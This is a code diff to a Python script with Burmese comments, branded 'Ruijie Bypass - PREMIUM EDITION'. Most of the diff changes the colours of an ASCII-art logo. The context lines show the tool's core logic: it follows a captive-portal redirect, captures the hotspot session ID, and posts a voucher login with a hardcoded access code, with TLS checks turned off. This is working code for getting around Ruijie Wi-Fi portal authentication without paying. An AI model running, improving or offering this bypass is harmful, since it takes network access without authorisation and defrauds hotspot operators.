@@ -21,13 +21,13 @@ def banner():
     # ၁။ အဝါရောင် အပေါ်စည်း
     print(f"{YELLOW} ="*35)
     
-    # ၂။ ဝါ၊ စိမ်း၊ နီ သုံးရောင်စပ် RUIJIE Logo
-    print(f"{YELLOW}      ██████╗ ██╗   ██╗██╗" + f"{GREEN}     ██╗██╗███████╗")
-    print(f"{YELLOW}      ██╔══██╗██║   ██║██║" + f"{GREEN}     ██║██║██╔════╝")
-    print(f"{YELLOW}      ██████╔╝██║   ██║██║" + f"{GREEN}     ██║██║█████╗  ")
-    print(f"{GREEN}      ██╔══██╗██║   ██║██║" + f"{RED}██   ██║██║██╔══╝  ")
-    print(f"{GREEN}      ██║  ██║╚██████╔╝██║" + f"{RED}╚█████╔╝██║███████╗")
-    print(f"{GREEN}      ╚═╝  ╚═╝ ╚═════╝ ╚═╝" + f"{RED} ╚════╝ ╚═╝╚══════╝")
+    # ၂။ Ruijie Logo ကို ဝါ၊ စိမ်း၊ နီ တစ်လိုင်းချင်းစီ ခွဲပြီး အရောင်ထည့်ခြင်း
+    print(f"{YELLOW}      ██████╗ ██╗   ██╗██╗     ██╗██╗███████╗")
+    print(f"{YELLOW}      ██╔══██╗██║   ██║██║     ██║██║██╔════╝")
+    print(f"{GREEN}      ██████╔╝██║   ██║██║     ██║██║█████╗  ")
+    print(f"{GREEN}      ██╔══██╗██║   ██║██║██   ██║██║██╔══╝  ")
+    print(f"{RED}      ██║  ██║╚██████╔╝██║╚█████╔╝██║███████╗")
+    print(f"{RED}      ╚═╝  ╚═╝ ╚═════╝ ╚═╝ ╚════╝ ╚═╝╚══════╝")
     
     # ၃။ အနီရောင် Edition စာသား
     print(f"        {RED}✨ Ruijie Bypass - PREMIUM EDITION ✨{RESET}")
@@ -94,7 +94,6 @@ def start_bypass():
                 time.sleep(10)
                 continue
 
-            # Capture Logic
             r = requests.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True, timeout=5)
             r1 = session.get(r.url, verify=False, timeout=5)
             
@@ -107,7 +106,6 @@ def start_bypass():
                 print(f"{GREEN}[✓] SID Captured: {sid[:15]}...{RESET}")
                 p_host = f"{urlparse(r.url).scheme}://{urlparse(r.url).netloc}"
                 
-                # Voucher Login
                 session.post(f"{p_host}/api/auth/voucher/", 
                              json={'accessCode': '123456', 'sessionId': sid, 'apiVersion': 1}, 
                              timeout=10)
